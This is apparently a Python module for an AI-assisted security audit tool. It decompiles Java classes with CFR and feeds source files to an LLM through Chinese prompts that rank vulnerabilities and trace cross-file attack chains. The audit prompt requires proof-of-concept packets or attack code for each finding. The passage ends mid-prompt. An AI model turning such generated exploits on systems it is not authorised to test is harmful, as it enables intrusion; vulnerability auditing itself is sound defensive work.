import logging
import os
import glob
import subprocess
import tempfile
from pathlib import Path
import zipfile
import shutil
import requests # For decompiler download
import sys # For sys.executable
import time # For potential delays
import json # To potentially parse structured AI output

from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QPushButton, QLabel, QHBoxLayout,
                             QCheckBox, QFileDialog, QProgressBar, QApplication) # Added QApplication
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from PyQt5.QtGui import QFont

# Assuming these are in the parent directory or accessible via PYTHONPATH
try:
    from api_adapter import APIAdapter
    from ui_utils import create_scroll_textedit
except ImportError:
    # Handle case where modules might not be directly found (e.g., running script directly)
    logging.error("Could not import APIAdapter or ui_utils. Ensure they are in the correct path.")
    # Define dummy classes/functions to prevent immediate crash, but functionality will be broken
    class APIAdapter:
        def chat_completion(self, *args, **kwargs):
            logging.error("Dummy APIAdapter called!")
            raise ConnectionError("API Adapter not loaded properly")
    def create_scroll_textedit(*args, **kwargs):
        from PyQt5.QtWidgets import QTextEdit, QFrame
        logging.error("Dummy create_scroll_textedit called!")
        # Return something that minimally works
        frame = QFrame()
        text_edit = QTextEdit()
        layout = QVBoxLayout(frame)
        layout.addWidget(text_edit)
        return frame, text_edit


# --- Worker Threads ---

class DecompileThread(QThread):
    """Handles decompilation of Java .class files."""
    decompile_complete = pyqtSignal(int, str)  # count, message
    progress_updated = pyqtSignal(int, str)  # percent, message

    def __init__(self, class_files, output_dir, base_temp_dir, parent=None):
        super().__init__(parent)
        self.class_files = class_files
        self.output_dir = output_dir # Where final .java files go
        self.base_temp_dir = base_temp_dir # Base dir for intermediate files/tools
        # Determine tools directory relative to the application executable or script
        if getattr(sys, 'frozen', False):
             # Running as packaged app (e.g., PyInstaller)
             self.app_base_dir = os.path.dirname(sys.executable)
        else:
             # Running as script (main.py is likely one level up from modules/)
             self.app_base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        # Prefer tools dir within app structure, fallback to temp dir if needed
        self.tools_dir = os.path.join(self.app_base_dir, "tools")
        logging.info(f"Determined tools directory: {self.tools_dir}")

        self.running = True
        self.decompiled_count = 0
        logging.info(f"DecompileThread initialized for {len(class_files)} files. Output: {output_dir}, Temp: {base_temp_dir}")

    def stop(self):
        logging.info("DecompileThread stop requested.")
        self.running = False

    def run(self):
        logging.info("DecompileThread run started.")
        if not self.class_files:
             logging.warning("No .class files provided for decompilation.")
             self.decompile_complete.emit(0, "没有找到 .class 文件")
             return

        try:
            logging.info("Ensuring output and tools directories exist...")
            os.makedirs(self.tools_dir, exist_ok=True)
            os.makedirs(self.output_dir, exist_ok=True)
            logging.info("Directories ensured.")
        except OSError as e:
             logging.error(f"Failed to create required directories: {e}", exc_info=True)
             self.decompile_complete.emit(0, f"创建目录失败: {e}")
             return

        try:
            logging.info("Checking for CFR decompiler...")
            # Ensure we have a decompiler (try downloading CFR)
            if not self.ensure_cfr_available():
                if not self.running: # Check if stopped during download attempt
                    self.decompile_complete.emit(0, "反编译被用户中止")
                    return
                logging.error("CFR decompiler not available and could not be downloaded.")
                self.progress_updated.emit(5, "无法获取CFR反编译器")
                self.decompile_complete.emit(0, "缺少CFR反编译器且无法下载")
                return
            logging.info("CFR decompiler check complete.")

            if not self.running:
                 logging.info("Stopping thread after CFR check.")
                 self.decompile_complete.emit(0, "反编译被用户中止")
                 return

            # Use CFR
            cfr_jar_path = os.path.join(self.tools_dir, "cfr-0.152.jar") # Use specific name
            logging.info(f"Attempting decompilation with CFR: {cfr_jar_path}")
            success_count = self.decompile_with_cfr_batch(cfr_jar_path)
            self.decompiled_count = success_count
            logging.info(f"CFR decompilation attempt finished. Success count: {success_count}")


            if not self.running:
                self.decompile_complete.emit(self.decompiled_count, "反编译被用户中止")
                return

            if self.decompiled_count > 0:
                 logging.info(f"Decompilation successful for {self.decompiled_count} files.")
                 self.decompile_complete.emit(self.decompiled_count, f"CFR反编译完成 ({self.decompiled_count} 文件)")
            else:
                 # Try other decompilers if CFR failed or generated nothing
                 logging.warning("CFR反编译未生成任何文件或失败.")
                 # Check if Java was the issue
                 if hasattr(self, "_java_not_found") and self._java_not_found:
                      self.decompile_complete.emit(0, "Java 未找到, 无法执行反编译")
                 else:
                    self.decompile_complete.emit(0, "CFR反编译失败或未生成文件")

        except Exception as e:
            logging.error(f"Decompilation process failed unexpectedly in run(): {e}", exc_info=True)
            self.decompile_complete.emit(self.decompiled_count, f"反编译过程出错: {str(e)}")
        finally:
            logging.info("DecompileThread run finished.")


    def ensure_cfr_available(self):
        """Checks for cfr.jar and downloads it if missing."""
        cfr_jar = os.path.join(self.tools_dir, "cfr-0.152.jar") # Use specific filename
        if os.path.exists(cfr_jar) and os.path.getsize(cfr_jar) > 500000: # Basic size check
            logging.info(f"Found existing CFR: {cfr_jar}")
            self.progress_updated.emit(10, "找到CFR反编译器")
            return True

        # --- Download CFR ---
        # Use GitHub releases URL which is generally more stable
        cfr_url = "https://github.com/leibnitz27/cfr/releases/download/0.152/cfr-0.152.jar"
        logging.info(f"CFR not found or invalid, attempting download from {cfr_url}")
        self.progress_updated.emit(5, f"下载 CFR...")
        try:
            # Use a reasonable timeout for the connection and read
            response = requests.get(cfr_url, stream=True, timeout=(10, 60)) # 10s connect, 60s read
            response.raise_for_status() # Check for HTTP errors

            total_size = int(response.headers.get('content-length', 0))
            downloaded = 0
            dl_progress_update_threshold = 0 # Track progress for UI updates

            # Create temp file path for download to avoid partial file issues
            temp_cfr_jar = cfr_jar + ".part"
            with open(temp_cfr_jar, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192 * 4): # Slightly larger chunk size
                    if not self.running:
                         logging.warning("Download cancelled during CFR download.")
                         if os.path.exists(temp_cfr_jar):
                              try: os.remove(temp_cfr_jar)
                              except OSError as e: logging.warning(f"Could not remove partial download {temp_cfr_jar}: {e}")
                         return False
                    if chunk:
                        f.write(chunk)
                        downloaded += len(chunk)
                        if total_size > 0:
                            percent_raw = (downloaded / total_size) * 100
                            # Scale progress within 5-10% range for UI
                            ui_percent = int(percent_raw * 0.05) + 5
                            # Update UI progress only every few percent to avoid flooding
                            if percent_raw >= dl_progress_update_threshold:
                                self.progress_updated.emit(ui_percent, f"下载 CFR... {int(percent_raw)}%")
                                dl_progress_update_threshold += 5 # Update every 5%

            # --- Download finished, check file and rename ---
            if downloaded > 0 and (total_size == 0 or downloaded == total_size):
                 # Check size again after download is complete
                 if os.path.exists(temp_cfr_jar) and os.path.getsize(temp_cfr_jar) > 500000:
                     # Move completed download to final destination
                     shutil.move(temp_cfr_jar, cfr_jar)
                     logging.info(f"CFR downloaded and saved successfully to {cfr_jar}")
                     self.progress_updated.emit(10, "CFR下载成功")
                     return True
                 else:
                     logging.error("CFR download completed but file is invalid or too small.")
                     if os.path.exists(temp_cfr_jar):
                          try: os.remove(temp_cfr_jar)
                          except OSError as e: logging.warning(f"Could not remove invalid download {temp_cfr_jar}: {e}")
                     self.progress_updated.emit(10, "CFR下载失败 (文件无效)")
                     return False
            else:
                 logging.error(f"CFR download incomplete. Expected {total_size}, got {downloaded}.")
                 if os.path.exists(temp_cfr_jar):
                     try: os.remove(temp_cfr_jar)
                     except OSError as e: logging.warning(f"Could not remove incomplete download {temp_cfr_jar}: {e}")
                 self.progress_updated.emit(10, "CFR下载失败 (未完成)")
                 return False

        except requests.exceptions.Timeout:
            logging.error(f"Timeout occurred while downloading CFR from {cfr_url}")
            self.progress_updated.emit(10, "CFR下载失败 (超时)")
            return False
        except requests.exceptions.RequestException as e:
            logging.error(f"Failed to download CFR: {e}", exc_info=True)
            self.progress_updated.emit(10, f"CFR下载失败: {e}")
            return False
        except Exception as e:
             logging.error(f"Unexpected error during CFR download/check: {e}", exc_info=True)
             self.progress_updated.emit(10, f"CFR准备失败: {e}")
             return False


    def decompile_with_cfr_batch(self, cfr_jar_path):
        """Decompiles using CFR, processing files in batches."""
        if not self.class_files: return 0
        if not os.path.exists(cfr_jar_path):
             logging.error(f"CFR JAR not found at expected path: {cfr_jar_path}")
             self.progress_updated.emit(15, "错误: CFR JAR丢失")
             return 0

        total_files = len(self.class_files)
        processed_count = 0
        batch_size = 50 # Adjust batch size based on performance/memory
        num_batches = (total_files + batch_size - 1) // batch_size

        logging.info(f"Starting CFR decompilation in {num_batches} batches of size {batch_size}.")
        self.progress_updated.emit(15, "开始CFR反编译...") # Update status before loop

        self._java_not_found = False # Flag to track if java command failed

        for i in range(num_batches):
             if not self.running:
                 logging.warning(f"Decompilation stopped by user during batch {i+1}.")
                 break

             start_index = i * batch_size
             end_index = min((i + 1) * batch_size, total_files)
             batch_files = self.class_files[start_index:end_index]

             # Calculate progress: 10% (download) + 85% (decompilation) + 5% (final count)
             base_progress = 10 # Start after download check/completion
             batch_progress_range = 85 # Allocate most progress to this
             # Ensure progress doesn't exceed 95 before final count
             current_progress = min(95, base_progress + int(((i + 1) / num_batches) * batch_progress_range))
             self.progress_updated.emit(current_progress, f"反编译批次 {i+1}/{num_batches}...")
             logging.debug(f"Processing batch {i+1}/{num_batches} ({len(batch_files)} files)")

             # --- Use subprocess.run directly for the batch ---
             cmd = ['java', '-jar', cfr_jar_path]
             cmd.extend(batch_files)
             cmd.extend(['--outputdir', self.output_dir, '--silent', 'true'])

             try:
                 logging.debug(f"Running command: {' '.join(cmd[:5])} ...")
                 result = subprocess.run(cmd,
                                         capture_output=True,
                                         text=True,
                                         encoding='utf-8',
                                         errors='ignore',
                                         timeout=180,
                                         check=False)

                 processed_count += len(batch_files)
                 logging.debug(f"Batch {i+1} completed. Return code: {result.returncode}")
                 if result.stdout and result.stdout.strip():
                     logging.debug(f"CFR Stdout (Batch {i+1}, truncated): {result.stdout[:500].strip()}")
                 if result.stderr and result.stderr.strip():
                     stderr_lower = result.stderr.lower()
                     if "warn:" in stderr_lower or "info:" in stderr_lower or "class version" in stderr_lower:
                          logging.debug(f"CFR Stderr (Batch {i+1}, truncated): {result.stderr[:1000].strip()}")
                     else:
                          logging.warning(f"CFR Stderr (Batch {i+1}, truncated): {result.stderr[:1000].strip()}")

             except subprocess.TimeoutExpired:
                  logging.error(f"CFR batch {i+1} timed out after 180 seconds.")
                  self.progress_updated.emit(current_progress, f"批次 {i+1} 超时")
                  processed_count += len(batch_files)
             except FileNotFoundError:
                 logging.error("Java command not found. Please ensure Java is installed and in system PATH.")
                 self.progress_updated.emit(current_progress, "错误: Java 未找到")
                 self.running = False
                 self._java_not_found = True
                 break
             except Exception as e:
                  logging.error(f"Error running CFR subprocess for batch {i+1}: {e}", exc_info=True)
                  processed_count += len(batch_files)


        # --- Final count of generated Java files ---
        try:
            logging.info("Counting generated Java files...")
            final_java_files = list(Path(self.output_dir).rglob('*.java'))
            final_count = len(final_java_files)
            logging.info(f"Decompilation process finished. Generated {final_count} Java files from {processed_count} attempted .class files.")
            self.progress_updated.emit(99, f"统计结果...")
            return final_count
        except Exception as e:
            logging.error(f"Error counting generated Java files in {self.output_dir}: {e}", exc_info=True)
            return 0


class SourceCodeAuditThread(QThread):
    """
    Performs security audit on source code files using AI with a two-pass approach
    for contextual analysis.
    """
    audit_complete = pyqtSignal(str)
    # Progress now represents overall progress (0-100), status indicates phase
    progress_updated = pyqtSignal(int, str) # percent, status_message

    # Constants for phases
    PHASE_GATHERING_CONTEXT = "正在分析项目结构..."
    PHASE_AUDITING = "正在进行安全审计..."

    def __init__(self, files, parent=None, is_decompiled_audit=False):
        super().__init__(parent)
        self.files = files
        self.api_adapter = APIAdapter()
        self.is_decompiled_audit = is_decompiled_audit
        self.running = True
        self.context_map = {} # Stores context gathered in Pass 1 {filepath: context_string}
        # --- Tunable Parameters for Token Management ---
        # Max tokens/chars for context summary (adjust based on total tokens available for audit prompt)
        self.max_context_summary_chars = 1500
        # Max chars from a single file for context gathering (Pass 1)
        self.max_file_chars_for_context = 1000
        # Max chars from a single file for the main audit prompt (Pass 2) - needs space for context summary too
        self.max_file_chars_for_audit = 2500 # Reduced to leave more space for context
        # 添加项目结构字段
        self.project_structure = {}
        # ------------------------------------------------
        logging.info(f"SourceCodeAuditThread initialized for {len(files)} files. Decompiled: {is_decompiled_audit}. Contextual Audit Enabled.")


    def stop(self):
        logging.info("SourceCodeAuditThread stop requested.")
        self.running = False


    def run(self):
        """Main execution method for the thread."""
        try:
            self.progress_updated.emit(0, self.PHASE_GATHERING_CONTEXT)
            
            logging.info(f"Starting source code audit on {len(self.files)} files.")
            
            # For storing audit results
            final_results = []
            
            # Pre-check for Java files if decompiled audit to adjust prompt later
            is_java_audit = any(f.lower().endswith('.java') for f in self.files)
            if is_java_audit:
                logging.info("Detected Java files in audit.")
            
            # --- STEP 0: Analyze Project Structure ---
            self.progress_updated.emit(5, "分析项目整体结构...")
            source_path = os.path.dirname(self.files[0]) if self.files else ""
            self.analyze_project_structure(self.files, source_path)

            # --- PASS 1: Context Gathering ---
            total_files = len(self.files)
            if total_files == 0:
                self.audit_complete.emit("没有找到文件可以审计")
                return
                
            # Process files in batches to avoid overwhelming memory
            batch_size = min(20, max(1, total_files // 10)) # Adaptive batch size based on file count
            batches = [self.files[i:i+batch_size] for i in range(0, total_files, batch_size)]
            
            self.progress_updated.emit(10, f"正在收集上下文 (0/{total_files})...")
            files_processed = 0
            
            for batch_idx, batch in enumerate(batches):
                if not self.running:
                    self.progress_updated.emit(100, "用户取消了操作")
                    self.audit_complete.emit("用户取消了审计操作")
                    return
                    
                for file_path in batch:
                    # Update progress on Pass 1 (context gathering): 10% to 40% range
                    files_processed += 1
                    progress = 10 + int((files_processed / total_files) * 30)
                    filename = os.path.basename(file_path)
                    self.progress_updated.emit(progress, f"收集上下文 ({files_processed}/{total_files}): {filename}")

                    # Process this file for context gathering
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            trimmed_content = self.trim_content(content, self.max_file_chars_for_context)
                            escaped_content = self.escape_special_chars(trimmed_content)
                            filename = os.path.basename(file_path)
                            prompt = self.construct_context_gathering_prompt(filename, escaped_content)
                            
                            # Call API to get context
                            messages = [
                                {"role": "system", "content": "你是一个专业的代码分析器，提取代码的关键信息。"},
                                {"role": "user", "content": prompt}
                            ]
                            context = self.chat_completion(messages=messages)
                            
                            # Store in context map
                            self.context_map[file_path] = context
                            logging.debug(f"Added context for {filename} ({len(context)} chars)")
                    except Exception as e:
                        logging.error(f"Error processing context for {file_path}: {e}", exc_info=True)
                        self.context_map[file_path] = f"[错误：无法处理此文件: {str(e)}]"
            
            # --- Build context summary now that all files are processed ---
            self.progress_updated.emit(40, "正在构建项目结构概要...")
            context_summary = self.build_overall_context_summary()
            dependency_info = self.analyze_file_dependencies()
            context_summary += "\n" + dependency_info
            
            # --- STEP 2: Identify High-Value Files ---
            self.progress_updated.emit(45, "正在识别高价值目标文件...")
            high_value_files = self.identify_high_value_files(self.files)
            
            # --- PASS 2: Code Audit with Context ---
            # First audit high-value files, then others if time permits
            self.progress_updated.emit(50, f"开始安全审计高优先级文件...")
            
            # High-value files first (40% of progress from 50% to 70%)
            high_value_count = len(high_value_files)
            for i, file_path in enumerate(high_value_files):
                if not self.running:
                    self.progress_updated.emit(100, "用户取消了操作")
                    self.audit_complete.emit("用户取消了审计操作")
                    return
                
                filename = os.path.basename(file_path)
                hv_progress = 50 + int(((i + 1) / max(1, high_value_count)) * 20)
                self.progress_updated.emit(hv_progress, f"审计高优先级文件 ({i+1}/{high_value_count}): {filename}")
                
                try:
                    # Read file again for audit pass - may use more content this time
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        trimmed_content = self.trim_content(content, self.max_file_chars_for_audit)
                        escaped_content = self.escape_special_chars(trimmed_content)
                        
                        # Create audit prompt for this file
                        audit_prompt = self.construct_audit_prompt_with_context(
                            filename, 
                            escaped_content, 
                            is_java=file_path.lower().endswith('.java'),
                            is_decompiled=self.is_decompiled_audit,
                            context_summary=context_summary
                        )
                        
                        # Call API to get audit results
                        messages = [
                            {"role": "system", "content": "你是一个资深的安全审计专家，专注于代码安全漏洞审计。"},
                            {"role": "user", "content": audit_prompt}
                        ]
                        audit_result = self.chat_completion(messages=messages)
                        
                        # Add to results if not marked as secure
                        if audit_result and "[安全]" not in audit_result:
                            final_results.append(f"=== {filename} ===\n{audit_result}\n")
                            logging.info(f"Found security issues in {filename}")
                
                except Exception as e:
                    logging.error(f"Error during audit of {file_path}: {e}", exc_info=True)
                    error_report = f"=== {filename} ===\n[错误] 审计过程中出错: {str(e)}\n"
                    final_results.append(error_report)
            
            # Remaining files (30% of progress from 70% to 90%)
            remaining_files = [f for f in self.files if f not in high_value_files]
            remaining_count = len(remaining_files)
            
            # Limit remaining files if too many (focus on high-value)
            max_remaining = min(remaining_count, 50)  # Limit to 50 additional files
            limited_remaining = remaining_files[:max_remaining]
            
            for i, file_path in enumerate(limited_remaining):
                if not self.running:
                    self.progress_updated.emit(100, "用户取消了操作")
                    self.audit_complete.emit("用户取消了审计操作")
                    return
                
                filename = os.path.basename(file_path)
                rem_progress = 70 + int(((i + 1) / max(1, max_remaining)) * 20)
                self.progress_updated.emit(rem_progress, f"审计常规文件 ({i+1}/{max_remaining}): {filename}")
                
                try:
                    # Read file again for audit pass
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        trimmed_content = self.trim_content(content, self.max_file_chars_for_audit)
                        escaped_content = self.escape_special_chars(trimmed_content)
                        
                        # Create audit prompt for this file
                        audit_prompt = self.construct_audit_prompt_with_context(
                            filename, 
                            escaped_content, 
                            is_java=file_path.lower().endswith('.java'),
                            is_decompiled=self.is_decompiled_audit,
                            context_summary=context_summary
                        )
                        
                        # Call API to get audit results
                        messages = [
                            {"role": "system", "content": "你是一个资深的安全审计专家，专注于代码安全漏洞审计。"},
                            {"role": "user", "content": audit_prompt}
                        ]
                        audit_result = self.chat_completion(messages=messages)
                        
                        # Add to results if not marked as secure
                        if audit_result and "[安全]" not in audit_result:
                            final_results.append(f"=== {filename} ===\n{audit_result}\n")
                            logging.info(f"Found security issues in {filename}")
                
                except Exception as e:
                    logging.error(f"Error during audit of {file_path}: {e}", exc_info=True)
            
            # --- Optional: Cross-file vulnerability analysis ---
            self.progress_updated.emit(90, "进行跨文件漏洞链分析...")
            
            if final_results:
                # Consolidate results for cross-file analysis
                combined_results = "\n".join(final_results)
                
                # Perform cross-file analysis
                cross_file_analysis = self.perform_cross_file_analysis(combined_results, context_summary)
                
                # Add to final output
                if cross_file_analysis and "未发现明确的跨文件漏洞利用链" not in cross_file_analysis:
                    final_results.append("\n=== 跨文件漏洞链分析 ===\n" + cross_file_analysis)
            
            # --- Prepare final report ---
            self.progress_updated.emit(95, "生成最终审计报告...")
            
            if final_results:
                final_output = "\n".join(final_results)
                summary = f"审计完成。发现 {len(final_results)} 个文件存在安全问题。\n\n"
                final_output = summary + final_output
            else:
                final_output = "审计完成。未发现明显的高危/中危安全漏洞。"
            
            self.progress_updated.emit(100, "审计完成!")
            self.audit_complete.emit(final_output)
            
        except Exception as e:
            logging.error(f"Error in source code audit thread: {e}", exc_info=True)
            self.progress_updated.emit(100, f"审计过程出错: {str(e)}")
            self.audit_complete.emit(f"审计过程中出现错误: {str(e)}")
            
        finally:
            self.running = False

    def analyze_project_structure(self, files_list, scan_path):
        """分析项目的整体结构"""
        try:
            # 分析文件类型分布
            file_types = {}
            for file_path in files_list:
                ext = os.path.splitext(file_path)[1].lower()
                if ext in file_types:
                    file_types[ext] += 1
                else:
                    file_types[ext] = 1
            
            # 分析目录结构
            directories = set()
            for file_path in files_list:
                rel_path = os.path.relpath(file_path, scan_path)
                directory = os.path.dirname(rel_path)
                if directory:
                    directories.add(directory)
            
            # 查找可能的入口点
            entry_points = []
            for file_path in files_list:
                filename = os.path.basename(file_path)
                # 常见入口点文件名模式
                if filename.lower() in ['main.java', 'application.java', 'app.py', 'index.php', 'main.js', 'app.js']:
                    entry_points.append(file_path)
                # 根据内容检测入口点
                if os.path.getsize(file_path) < 1024 * 100:  # 限制文件大小检查
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            # 寻找可能的main方法或应用启动代码
                            if (('public static void main' in content) or 
                                ('app.listen' in content) or 
                                ('if __name__ == "__main__"' in content)):
                                entry_points.append(file_path)
                    except Exception as e:
                        logging.warning(f"无法分析可能的入口点 {file_path}: {str(e)}")
            
            # 保存分析结果
            self.project_structure = {
                'file_types': file_types,
                'directories': list(directories),
                'entry_points': entry_points,
                'total_files': len(files_list)
            }
            
            logging.info(f"项目结构分析: {len(files_list)}个文件, {len(directories)}个目录, {len(entry_points)}个可能的入口点")
        except Exception as e:
            logging.error(f"项目结构分析错误: {str(e)}", exc_info=True)
    
    def analyze_file_dependencies(self):
        """分析文件之间的依赖关系"""
        dependency_info = "文件依赖关系图:\n"
        
        # 构建依赖图
        dependency_graph = {}
        for file_path, context_str in self.context_map.items():
            filename = os.path.basename(file_path)
            dependencies = []
            
            # 从上下文中提取依赖信息
            if "导入和依赖关系:" in context_str:
                dep_info = context_str.split("导入和依赖关系:")[1].strip().split('\n')[0]
                dependencies = [d.strip() for d in dep_info.split(',') if d.strip()]
            
            dependency_graph[filename] = dependencies
        
        # 识别重要的依赖关系
        important_dependencies = []
        for file, deps in dependency_graph.items():
            if len(deps) > 3:  # 有多个依赖项的文件
                important_dependencies.append((file, deps))
        
        # 按依赖数量排序
        important_dependencies.sort(key=lambda x: len(x[1]), reverse=True)
        
        # 取前10个最重要的依赖关系
        for file, deps in important_dependencies[:10]:
            dependency_info += f"- {file} 依赖于: {', '.join(deps[:5])}"
            if len(deps) > 5:
                dependency_info += f" 和其他{len(deps)-5}个依赖项"
            dependency_info += "\n"
        
        return dependency_info
    
    def identify_high_value_files(self, files_list):
        """识别高价值目标文件进行优先审计"""
        high_value_files = []
        
        # 定义高价值文件关键词
        high_value_keywords = [
            'security', 'auth', 'login', 'password', 'token', 'oauth',
            'user', 'admin', 'upload', 'download', 'file', 'exec',
            'command', 'sql', 'database', 'config', 'setting', 'api', 
            'controller', 'request', 'input', 'validate', 'filter'
        ]
        
        # 评估每个文件的价值
        file_scores = []
        for file_path in files_list:
            filename = os.path.basename(file_path)
            score = 0
            
            # 基于文件名的评分
            for keyword in high_value_keywords:
                if keyword.lower() in filename.lower():
                    score += 2
            
            # 基于文件内容的评分
            if file_path in self.context_map:
                context = self.context_map[file_path]
                # 检查上下文中的敏感功能描述
                for keyword in high_value_keywords:
                    if keyword.lower() in context.lower():
                        score += 1
                
                # 优先考虑有"主要功能"描述的文件
                if "主要功能:" in context:
                    func_desc = context.split("主要功能:")[1].strip().split('\n')[0]
                    for keyword in high_value_keywords:
                        if keyword.lower() in func_desc.lower():
                            score += 3
            
            # 将得分和文件添加到列表
            file_scores.append((file_path, score))
        
        # 按分数降序排序
        file_scores.sort(key=lambda x: x[1], reverse=True)
        
        # 取前25%的文件为高价值文件
        high_value_count = max(int(len(files_list) * 0.25), 5)  # 至少5个文件
        high_value_files = [file for file, score in file_scores[:high_value_count] if score > 0]
        
        logging.info(f"已识别{len(high_value_files)}个高优先级文件进行优先审计")
        return high_value_files
    
    def perform_cross_file_analysis(self, results, context_summary):
        """执行跨文件漏洞链分析"""
        if not results or results.strip() == "":
            return "未发现需要跨文件分析的漏洞。"
        
        prompt = f"""【任务】执行跨文件漏洞链分析
【项目上下文】
{context_summary}

【已发现漏洞】
{results}

【指令】
基于上述发现的单个漏洞，寻找可能的跨文件漏洞链，着重分析:
1. 是否存在多个漏洞形成的攻击链
2. 从接入点到敏感点的完整调用路径
3. 数据流动如何跨文件传播
4. 综合评估利用条件和攻击复杂度

只输出有确凿证据的关联漏洞，格式如下：
【漏洞链1】漏洞A → 漏洞B → 漏洞C
- 攻击路径: 描述从入口到最终利用点的路径
- 利用条件: 描述成功利用的条件
- 最终影响: 描述可能造成的最严重后果
- 建议修复: 修复建议

如无明确关联，请输出: "未发现明确的跨文件漏洞利用链。"
"""

        try:
            # 使用messages列表格式调用AI
            messages = [
                {"role": "system", "content": "你是一个资深的安全渗透专家，专注于代码审计和漏洞链分析。"},
                {"role": "user", "content": prompt}
            ]
            cross_file_analysis = self.chat_completion(messages=messages)
            return cross_file_analysis
        except Exception as e:
            logging.error(f"执行跨文件漏洞分析时出错: {str(e)}", exc_info=True)
            return "执行跨文件分析时发生错误。"

    def trim_content(self, content, max_chars):
        """
        Trims file content to stay within token limits.
        Attempts to keep the most meaningful parts of the code.
        """
        if not content or len(content) <= max_chars:
            return content
        
        # 计算保留的字符数
        half_chars = max_chars // 2
        
        # 保留前部和后部，中间使用省略标记
        return content[:half_chars] + "\n\n/* ... 内容长度超过限制，中间部分已省略 ... */\n\n" + content[-half_chars:]
    
    def escape_special_chars(self, content):
        """
        Escapes special characters that might confuse the LLM.
        Helps maintain code structure in the prompt.
        """
        if not content:
            return ""
        
        # 在真实环境中可能需要更多的转义，这里仅做基本处理
        # 主要防止代码中的特殊字符干扰提示词格式
        return content.replace('\\', '\\\\').replace('```', '\\`\\`\\`')
    
    def construct_context_gathering_prompt(self, filename, escaped_content):
        """创建第一阶段（上下文收集）的提示词。"""
        # 保持提示词简洁明了，专注于提取关键信息
        return f"""【指令】分析以下代码文件 `{filename}`。严格提取以下信息，输出务必简洁，每个信息点一行：
1.  `类名: [主要公共类名]`
2.  `方法签名: [最多5个关键公共方法签名，用逗号分隔]` (例如: public String getUser(int id), public void deleteUser(int id))
3.  `主要功能: [一句话总结核心功能]` (例如: 用户认证服务)
4.  `导入和依赖关系: [外部库和其他项目文件的依赖]` (例如: import java.sql.*, 依赖UserDAO.java)
5.  `数据流: [输入和输出点]` (例如: 从HTTP请求获取参数，写入数据库)

【代码内容】
```
{escaped_content}
```

【输出】（请严格按上述格式）"""
    
    def build_overall_context_summary(self):
        """构建项目整体上下文概要，遵循字符限制。"""
        summary = "【项目全局上下文概要】\n"
        current_length = len(summary)
        limit = self.max_context_summary_chars # 使用预定义的限制

        # 1. 添加项目结构概述
        project_structure = "项目结构概述:\n"
        file_types = {}
        for file_path in self.context_map.keys():
            ext = os.path.splitext(file_path)[1].lower()
            if ext in file_types:
                file_types[ext] += 1
            else:
                file_types[ext] = 1
        
        for ext, count in file_types.items():
            project_structure += f"- {ext} 文件: {count}个\n"
        
        summary += project_structure + "\n"
        current_length = len(summary)
        
        # 2. 识别关键文件 - 基于上下文信息的重要性
        important_files = []
        for file_path, context_str in self.context_map.items():
            filename = os.path.basename(file_path)
            importance_score = 0
            
            # 增加如果包含关键词的重要性
            keywords = ["controller", "service", "dao", "security", "auth", "admin", "user", "password", 
                       "login", "config", "utils", "main", "api", "database", "validation"]
            for keyword in keywords:
                if keyword.lower() in filename.lower() or keyword.lower() in context_str.lower():
                    importance_score += 1
            
            important_files.append((file_path, importance_score))
        
        # 排序并选择最重要的文件
        important_files.sort(key=lambda x: x[1], reverse=True)
        top_important = important_files[:min(10, len(important_files))]
        
        summary += "关键文件:\n"
        for file_path, _ in top_important:
            filename = os.path.basename(file_path)
            if "主要功能:" in self.context_map[file_path]:
                main_function = self.context_map[file_path].split("主要功能:")[1].strip().split('\n')[0]
                summary += f"- {filename}: {main_function}\n"
            else:
                summary += f"- {filename}\n"
        
        summary += "\n"
        current_length = len(summary)
        
        # 3. 添加常规文件摘要
        sorted_items = sorted(self.context_map.items())
        included_files = 0
        
        for file_path, context_str in sorted_items:
            if file_path in [p for p, _ in top_important]:
                continue  # 跳过已经作为关键文件包含的
                
            filename = os.path.basename(file_path)
            # 尝试提取"主要功能"部分以简明扼要
            func_summary = "未知功能"
            if "主要功能:" in context_str:
                parts = context_str.split("主要功能:")
                if len(parts) > 1:
                    func_summary = parts[1].strip().split('\n')[0]

            entry = f"- {filename}: {func_summary}\n"
            if current_length + len(entry) < limit:
                summary += entry
                current_length += len(entry)
                included_files += 1
            else:
                logging.warning(f"由于字符限制({limit})，整体上下文概要已被截断。")
                summary += "- ... (更多文件信息已省略)\n"
                break
        
        return summary
        
    def construct_audit_prompt_with_context(self, filename, escaped_content, is_java, is_decompiled, context_summary):
        """创建第二阶段（带上下文的审计）提示词。"""

        # 基础指令 - 直接把{filename}替换为实际文件名，避免后续格式化问题
        common_instructions = f"""【强制指令】你是一个资深的安全审计专家。请执行深度源码安全审计：

1. 安全审计流程：
   1.1 深度分析代码，识别风险点：
       - 用户输入处理：SQL操作、命令执行、反序列化
       - 文件操作：路径遍历、上传/下载漏洞
       - 认证与授权机制：访问控制、权限绕过
       - 会话管理：CSRF、会话固定
       - 前端安全：XSS、DOM操作、CORS
       - 敏感信息：硬编码凭证、密钥暴露
       - 配置缺陷：默认配置、权限设置
   1.2 验证漏洞可利用性：
       - 分析攻击路径和触发条件
       - 考虑项目整体结构和上下文
       - 评估跨文件漏洞链（函数调用链）
   1.3 按CVSS标准评估风险：
       - 高危(CVSS 8.0-10.0)：可直接利用的RCE、SQLi等
       - 中危(CVSS 5.0-7.9)：需要一定条件的XSS、CSRF等
       - 低危(CVSS 0.1-4.9)：轻微信息泄露等

2. 输出规则：
   - 仅输出确认存在的高危/中危漏洞
   - 格式规范：[风险等级] 类型 - 位置:行号 - 50字内描述
   - 跨文件漏洞标记为：[高危|跨文件]
   - 解释攻击链和数据流向
   - 每文件最多报告3个严重问题
   - 必须给出POC数据包或攻击代码
   - 如果安全，输出"[安全] 未发现明显高危/中危漏洞"

3. 安全检测要点：
   - 代码质量：反模式、不安全函数使用
   - 业务逻辑漏洞：条件绕过、状态混淆
   - 第三方组件：已知CVE、过时版本
   - 输入验证：缺少过滤、类型检查不全
   - 安全实现：弱加密、随机性不足

4. 输出示例：
   [高危] SQL注入 - {filename}:32 - 未过滤的user_id参数直接拼接SQL查询
   [攻击链] Controller接收参数 → 传递给Service → 未过滤拼接SQL
